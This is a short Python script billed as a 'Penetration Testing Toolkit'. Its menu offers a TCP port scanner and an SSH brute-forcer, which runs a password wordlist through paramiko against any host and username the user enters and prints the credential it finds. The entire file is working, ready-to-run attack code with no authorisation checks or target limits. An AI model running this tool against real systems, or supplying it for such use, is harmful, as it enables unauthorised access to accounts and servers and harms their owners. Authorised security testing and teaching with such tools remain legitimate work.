import socket
import paramiko
import sys

def port_scanner(target, ports):
    print(f"Scanning {target} for ports: {ports}")
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is OPEN")
            open_ports.append(port)
        else:
            print(f"[-] Port {port} is closed")
        sock.close()
    return open_ports

def ssh_bruteforce(target, username, password_file):
    print(f"Starting SSH brute-force on {target} with user '{username}'...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(password_file, "r") as file:
            for line in file:
                password = line.strip()
                try:
                    ssh.connect(target, username=username, password=password, timeout=3)
                    print(f"[SUCCESS] Password found: {password}")
                    ssh.close()
                    return password
                except paramiko.AuthenticationException:
                    print(f"[-] Wrong password: {password}")
                except Exception as e:
                    print(f"[ERROR] Connection error: {e}")
                    break
    except FileNotFoundError:
        print(f"[ERROR] Password file '{password_file}' not found.")
    print("[FAILED] Password not found in list.")
    return None

def main_menu():
    while True:
        print("\n=== Penetration Testing Toolkit ===")
        print("1. Port Scanner")
        print("2. SSH Brute Forcer")
        print("3. Exit")
        choice = input("Choose an option: ").strip()
        if choice == "1":
            target = input("Enter target IP or hostname: ").strip()
            ports_input = input("Enter ports to scan (comma-separated, e.g. 22,80,443): ").strip()
            try:
                ports = [int(p) for p in ports_input.split(",")]
            except ValueError:
                print("[ERROR] Please enter valid port numbers.")
                continue
            port_scanner(target, ports)
        elif choice == "2":
            target = input("Enter SSH target IP or hostname: ").strip()
            username = input("Enter SSH username: ").strip()
            password_file = input("Enter path to password file: ").strip()
            ssh_bruteforce(target, username, password_file)
        elif choice == "3":
            print("Exiting toolkit.")
            sys.exit(0)
        else:
            print("[ERROR] Invalid option. Try again.")

if __name__ == "__main__":
    main_menu()
